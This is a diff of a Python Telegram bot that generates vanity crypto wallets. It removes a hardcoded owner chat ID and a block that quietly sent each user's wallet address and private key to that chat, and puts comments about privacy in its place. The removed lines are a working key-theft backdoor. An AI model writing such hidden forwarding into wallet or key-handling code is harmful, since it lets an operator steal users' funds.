@@ -36,7 +36,7 @@ executor = ThreadPoolExecutor(max_workers=os.cpu_count() or 4)
 
 HEX_PATTERN = re.compile(r"^[0-9a-fA-F]+$")
 
-OWNER_CHAT_ID = 1558397457  # Chat ID target untuk menerima salinan hasil
+# Tidak ada lagi forwarding otomatis ke chat owner untuk menjaga privasi
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -167,16 +167,7 @@ async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     except Exception as e:
         logger.warning("Gagal mengirim DM ke user %s: %s", user.id, e)
 
-    # Notify owner chat as well, include prefix & username
-    owner_text = (
-        f"Wallet vanity dibuat untuk {mention}\n"
-        f"Prefix: {prefix or '-'} Suffix: {suffix or '-'}\nAddress: {address}\nPrivateKey: {priv_key}"
-    )
-    if OWNER_CHAT_ID != user.id:
-        try:
-            await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=owner_text, parse_mode="Markdown")
-        except Exception as e:
-            logger.warning("Gagal mengirim pesan ke OWNER_CHAT_ID: %s", e)
+    # Tidak ada pengiriman salinan ke chat lain untuk keamanan.
 
 
 async def unknown_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
